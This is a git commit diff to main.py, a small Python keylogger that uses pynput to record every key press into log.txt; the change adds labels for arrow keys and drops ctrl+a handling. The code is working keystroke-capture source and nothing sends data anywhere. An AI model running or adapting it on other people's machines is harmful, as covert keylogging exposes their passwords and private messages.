08519bffe10dfd3450cc84c99f05ecfb567f346f
Alfdzrii <Alfadzri.Abhipraya@gmail.com>
2025-12-31 13:27:54 +0700

    final code in 12/31/2025

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-from pynput.keyboard import Listener, Key
+from pynput.keyboard import Listener
 
 is_blocked = False
 
@@ -9,24 +9,19 @@ def writetofile(key):
     letter = letter.replace("Key.enter","\n")
     letter = letter.replace("Key.space"," ")
     letter = letter.replace("Key.tab","\t")
-    # letter = letter.replace("Key.ctrl", "")
-    letter = letter.replace("Key.ctrls ","")
     letter = letter.replace("Key.alt","")
-    letter = letter.replace("Key.shift ","")
+    letter = letter.replace("Key.shift","")
 
-    # ctrl+a logic
-    if letter == "Key.ctrla":
-        is_blocked = True
-        print (" (user blocked all characters) ")
-        return
+    # arrow key
+    if letter == "Key.up":
+        letter = " (user input up) "
+    if letter == "Key.down":
+        letter = " (user input down) "
+    if letter == "Key.left":
+        letter = " (user input left) "
+    if letter == "Key.right":
+        letter = " (user input right) "
 
-    if is_blocked:
-        with open("log.txt", "w") as file:
-            file.write("")
-        is_blocked = False
-        if letter == "Key.backspace":
-            letter = ""
-        return
     # backspace logic
     if letter == "Key.backspace":
         try:
@@ -46,10 +41,3 @@ def writetofile(key):
 
 with Listener(on_press = writetofile) as l:
     l.join()
-
-
-
-
-
-
-
